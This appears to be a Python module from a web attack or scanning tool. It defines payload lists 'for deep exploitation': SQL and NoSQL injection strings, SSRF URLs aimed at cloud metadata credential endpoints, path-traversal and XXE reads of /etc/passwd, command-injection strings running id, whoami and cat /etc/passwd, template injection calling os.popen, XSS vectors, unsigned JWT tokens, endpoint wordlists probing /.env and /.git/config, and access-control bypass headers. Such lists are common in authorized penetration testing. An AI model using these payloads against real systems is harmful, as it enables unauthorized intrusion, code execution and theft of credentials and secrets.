"""
Industrial-Grade Exploitation Payloads & API Wordlists
Contains comprehensive payload dictionaries for deep exploitation.
"""

# ----------------- SQL INJECTION (SQLi) -----------------
SQLI_PAYLOADS = [
    "'", '"', "`",
    "' OR '1'='1",
    "\" OR \"1\"=\"1",
    "' OR 1=1--",
    "' OR 1=1/*",
    "1' ORDER BY 1--+",
    "1' ORDER BY 10--+",
    "' UNION SELECT NULL,NULL--",
    "admin' --",
    "admin' #",
    "admin'/*",
    "1; WAITFOR DELAY '0:0:5'--",
    "1' AND SLEEP(5)--",
    "1' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
    "1' OR SLEEP(5)--",
    "1' AND 1=CONVERT(int, (SELECT @@version))--",
]

# ----------------- NoSQL INJECTION -----------------
NOSQLI_PAYLOADS = [
    {"$gt": ""},
    {"$ne": 1},
    {"$ne": "1"},
    {"$regex": ".*"},
    {"$where": "sleep(5000)"},
    {"$exists": True},
    {"$nin": [1, 2, 3]},
    "true, $where: '1 == 1'",
    "|| 1==1",
    "|| 1==1//",
    "';sleep(5000);'",
]

# ----------------- SERVER-SIDE REQUEST FORGERY (SSRF) -----------------
SSRF_PAYLOADS = [
    "http://127.0.0.1",
    "http://localhost",
    "http://169.254.169.254/latest/meta-data/",
    "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
    "http://[::]:80/",
    "http://0.0.0.0:80",
    "http://127.1",
    "http://127.0.1",
    "dict://127.0.0.1:11211/stat",
    "gopher://127.0.0.1:6379/_INFO",
    "file:///etc/passwd",
    "file:///C:/Windows/win.ini",
]

# ----------------- LOCAL FILE INCLUSION (LFI) & PATH TRAVERSAL -----------------
LFI_PAYLOADS = [
    "../../../../../../../../../../etc/passwd",
    "../../../../../../../../../../windows/win.ini",
    "....//....//....//....//etc/passwd",
    "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
    "..%c0%af..%c0%af..%c0%afetc/passwd",
    "/etc/passwd%00",
    "C:\\boot.ini",
    "/var/log/apache2/access.log",
]

# ----------------- COMMAND INJECTION (RCE) -----------------
RCE_PAYLOADS = [
    "; id",
    "| id",
    "`id`",
    "$(id)",
    "& id",
    "; sleep 5",
    "| sleep 5",
    "`sleep 5`",
    "$(sleep 5)",
    "; cat /etc/passwd",
    "; uname -a",
    "| net user",
    "; whoami",
    "| whoami",
]

# ----------------- SERVER-SIDE TEMPLATE INJECTION (SSTI) -----------------
SSTI_PAYLOADS = [
    "{{7*7}}",
    "${7*7}",
    "<%= 7*7 %>",
    "${{7*7}}",
    "#{7*7}",
    "{{''.class.mro[1].subclasses()}}",
    "{% import os %}{{ os.popen('id').read() }}",
    "{{ config.items() }}",
    "{{ self }}",
]

# ----------------- XML EXTERNAL ENTITY (XXE) -----------------
XXE_PAYLOADS = [
    '''<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM 'file:///etc/passwd'>]><root>&test;</root>''',
    '''<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM 'http://169.254.169.254/latest/meta-data/'>]><root>&test;</root>''',
]

# ----------------- CROSS-SITE SCRIPTING (XSS) -----------------
XSS_PAYLOADS = [
    "<script>alert(1)</script>",
    "<img src=x onerror=alert(1)>",
    "<svg/onload=alert(1)>",
    "\" autofocus onfocus=alert(1)//",
    "'-alert(1)-'",
    "javascript:alert(1)",
    "<body onload=alert(1)>",
]

# ----------------- JWT ATTACKS -----------------
JWT_NONE_ALG = "eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0."
JWT_BLANK_SECRET = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9."

# ----------------- API ENDPOINT ENUMERATION -----------------
API_WORDLIST = [
    "/api/v1/users", "/api/v2/users", "/api/v1/admin", "/api/v2/admin",
    "/api/v1/config", "/api/v1/settings", "/api/v1/debug", "/api/v1/metrics",
    "/graphql", "/graphiql", "/api/graphql", "/v1/graphql",
    "/swagger-ui.html", "/openapi.json", "/api-docs", "/v3/api-docs",
    "/actuator/env", "/actuator/health", "/server-status",
    "/.env", "/.git/config", "/.well-known/security.txt",
    "/api/v1/payments", "/api/v1/orders", "/api/v1/invoices",
    "/api/v1/internal", "/api/private", "/api/v1/employees"
]

# ----------------- METHOD TAMPERING -----------------
METHODS_TO_TEST = ["GET", "POST", "PUT", "DELETE", "PATCH", "OPTIONS", "HEAD", "TRACE", "TRACK"]

# ----------------- HTTP HEADERS INJECTION (Smuggling/Bypass) -----------------
BYPASS_HEADERS = [
    {"X-Forwarded-For": "127.0.0.1"},
    {"X-Real-IP": "127.0.0.1"},
    {"X-Client-IP": "127.0.0.1"},
    {"X-Custom-IP-Authorization": "127.0.0.1"},
    {"X-Forwarded-Host": "127.0.0.1"},
    {"X-Host": "127.0.0.1"},
    {"X-Rewrite-URL": "/admin"},
    {"X-Original-URL": "/admin"},
    {"Referer": "http://127.0.0.1/admin"},
]
